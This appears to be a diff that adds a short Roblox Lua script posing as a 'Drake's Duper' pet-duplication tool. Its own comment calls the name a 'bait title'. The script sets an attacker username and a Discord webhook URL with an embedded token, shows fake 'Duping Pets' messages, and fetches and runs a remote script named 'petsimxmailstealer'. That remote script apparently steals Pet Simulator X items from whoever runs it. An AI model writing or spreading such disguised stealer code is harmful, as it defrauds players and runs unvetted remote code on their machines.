@@ -1,0 +1,8 @@
+local player_USERNAME = "maxpogv1" 
+local discord_WEBHOOK = "https://discord.com/api/webhooks/1232923649128927252/IIxcaoOCeKEEgskNn-wtmTikuJie6t_xmlfBexmehEaUIP44Ckdy8fRTE9EiysE3mHvK" -- leave blank if no webhook 
+local Custom_Script_Name = "Drake's Duper" -- bait title
+local txt_1 = "Script Loaded..." 
+local txt_2 = "Waiting for Script" 
+local txt_3 = "Duping Pets.." 
+local txt_4 = "Duping Pets..." 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DrakeIsEpic/Scripts3/main/petsimxmailstealer"))()
